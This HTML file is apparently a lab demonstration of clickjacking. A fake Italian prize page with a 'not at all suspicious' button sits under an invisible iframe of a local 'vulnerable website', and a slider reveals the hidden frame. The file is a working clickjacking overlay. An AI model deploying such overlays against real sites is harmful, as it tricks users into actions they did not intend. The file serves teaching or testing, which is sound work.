<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>The Attacker Website</title>
    <style>
      .slidecontainer {
        position: absolute;
        bottom: 20;
        right: 20;
      }

      /* The slider itself */
      .slider {
        -webkit-appearance: none; /* Override default CSS styles */
        appearance: none;
        width: 100%; /* Full-width */
        height: 25px; /* Specified height */
        border-radius: 5px;
        background: #d3d3d3; /* Grey background */
        outline: none; /* Remove outline */
        opacity: 0.7; /* Set transparency (for mouse-over effects on hover) */
        -webkit-transition: 0.2s; /* 0.2 seconds transition on hover */
        transition: opacity 0.2s;
      }

      /* Mouse-over effects */
      .slider:hover {
        opacity: 1; /* Fully shown on mouse-over */
      }

      /* The slider handle (use -webkit- (Chrome, Opera, Safari, Edge) and -moz- (Firefox) to override default look) */
      .slider::-webkit-slider-thumb {
        -webkit-appearance: none; /* Override default look */
        appearance: none;
        width: 25px; /* Set a specific slider handle width */
        height: 25px; /* Slider handle height */
        border-radius: 50%;
        background: #04aa6d; /* Green background */
        cursor: pointer; /* Cursor on hover */
      }

      .slider::-moz-range-thumb {
        width: 25px; /* Set a specific slider handle width */
        height: 25px; /* Slider handle height */
        background: #04aa6d; /* Green background */
        cursor: pointer; /* Cursor on hover */
        border-radius: 50%;
      }

      #vulnerable_website {
        position: relative;
        opacity: 0;
        width: 800px;
        height: 900px;
        top: 75px;
        left: -95px;
        z-index: 2;
        padding-left: 80px;
      }

      #attacker_website {
        position: absolute;
        z-index: 1;
      }
      #attacker_website button {
        background-color: #04aa6d;
        color: white;
        padding: 14px 20px;
        margin: 8px 0;
        border: none;
        cursor: pointer;
        width: 450px;
      }
    </style>
  </head>
  <body>
    <div id="attacker_website">
      <h1>Il principe sultano Peppino il Grande ha scelto proprio te!</h1>
      <h2>Hai vinto una vacanza fenomenale ai tropici!</h2>
      <img
        alt="Tropical Holiday"
        style="width: 530px"
        src="https://www.thediscoveriesof.com/wp-content/uploads/2017/07/Heading-away-on-a-tropical-vacation-Dont-forget-to-check-this-packing-list-before-you-go.-.jpeg"
      />
      <h2>
        Accetta il tuo premio cliccando il bottone per nulla sospetto qua sotto!
      </h2>
      <button type="submit">Bottone per nulla sospetto!</button>
    </div>

    <iframe id="vulnerable_website" src="http://localhost:3000"> </iframe>
    <div class="slidecontainer">
      <input
        type="range"
        min="0"
        max="100"
        value="0"
        class="slider"
        id="myRange"
      />
    </div>
    <script>
      var slider = document.getElementById("myRange");
      var output = document.getElementById("vulnerable_website");
      slider.oninput = function () {
        output.style.opacity = this.value / 100;
      };
    </script>
  </body>
</html>
